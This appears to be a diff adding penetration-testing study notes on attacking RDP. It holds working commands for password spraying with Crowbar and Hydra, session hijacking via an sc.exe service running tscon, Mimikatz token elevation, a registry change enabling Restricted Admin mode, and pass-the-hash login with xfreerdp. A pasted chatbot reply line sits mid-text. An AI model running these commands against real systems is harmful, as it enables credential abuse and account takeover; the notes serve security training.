@@ -971,3 +971,138 @@ GO
 **Additional Considerations:**
 - **Quotes in Queries:** Use double single quotes to escape single quotes when sending queries to linked servers.
 - **Multiple Commands:** Separate multiple commands with a semicolon `;`.
+# Attacking RDP
+Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site.
+
+RDP uses port TCP/3389. 
+```
+nmap -Pn -p3389 192.168.2.143
+```
+## Misconfigurations
+RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. 
+
+Using the Crowbar tool, we can perform a password spraying attack against the RDP service. As an example below, the password password123 will be tested against a list of usernames in the usernames.txt file.
+
+```
+cat usernames.txt
+```
+#### Crowbar - RDP Password Spraying
+```
+ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+```
+#### Hydra - RDP Password Spraying
+```
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+```
+We can RDP into the target system using the rdesktop client or xfreerdp client with valid credentials.
+#### RDP Login
+```
+ rdesktop -u admin -p password123 192.168.2.143
+```
+## Protocol Specific Attacks
+
+Sure! Here are the notes in Markdown syntax:
+
+---
+
+### RDP Session Hijacking
+
+**Scenario:**
+- You gain access to a machine with local administrator privileges.
+- Another user is connected via Remote Desktop Protocol (RDP).
+
+**Objective:**
+- Hijack the user's RDP session to escalate privileges and impersonate the account.
+- Potentially take over a Domain Admin account in an Active Directory environment.
+
+**Steps:**
+
+1. **Identify User Sessions:**
+   ```cmd
+   query user
+   ```
+   - Example output:
+     ```plaintext
+     USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+     >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+      lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+     ```
+
+2. **Create a Service to Hijack the Session:**
+   ```cmd
+   sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+   ```
+
+3. **Start the Service:**
+   ```cmd
+   net start sessionhijack
+   ```
+
+**Outcome:**
+- A new terminal with the `lewen` user session will appear.
+- You can now explore network privileges and potentially escalate further.
+
+### Methods to Obtain SYSTEM Privileges
+
+1. **Using `PsExec`:**
+   ```cmd
+   PsExec.exe -i -s cmd.exe
+   ```
+
+2. **Using `Mimikatz`:**
+   ```mimikatz
+   privilege::debug
+   token::elevate
+   ```
+
+3. **Creating a Windows Service:**
+   ```cmd
+   sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+   net start sessionhijack
+   ```
+
+### Privilege Levels Explained
+
+**Local Administrator:**
+- **Definition:** Can manage the local machine.
+- **Capabilities:** Install software, change system settings, manage user accounts.
+
+**SYSTEM:**
+- **Definition:** The highest privilege level in Windows.
+- **Capabilities:** Perform any task, access all system files and settings, direct kernel interaction.
+
+**Domain Admin:**
+- **Definition:** Has administrative rights across an entire Active Directory domain.
+- **Capabilities:** Manage all machines and accounts within the domain, enforce domain-wide policies.
+
+### RDP Pass-the-Hash (PtH)
+
+**Scenario:**
+- Access applications or software on a user's Windows system requiring GUI access during a penetration test.
+- Only have the NT hash of the user, not the plaintext password.
+
+**Objective:**
+- Gain GUI access to the target system using the NT hash via an RDP PtH attack.
+
+**Requirements:**
+- **Restricted Admin Mode:** Must be enabled on the target host.
+
+**Enable Restricted Admin Mode:**
+- Add the registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.
+- Command to add the registry key:
+  ```cmd
+  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+  ```
+
+**Using `xfreerdp` for RDP PtH:**
+- Command to gain RDP access with NT hash:
+  ```bash
+  xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+  ```
+
+**Outcome:**
+- Gain RDP access as the target user without knowing their cleartext password.
+
+**Considerations:**
+- Not all Windows systems will be vulnerable.
+- Worth attempting if you have an NTLM hash, the user has RDP rights, and GUI access benefits the assessment.
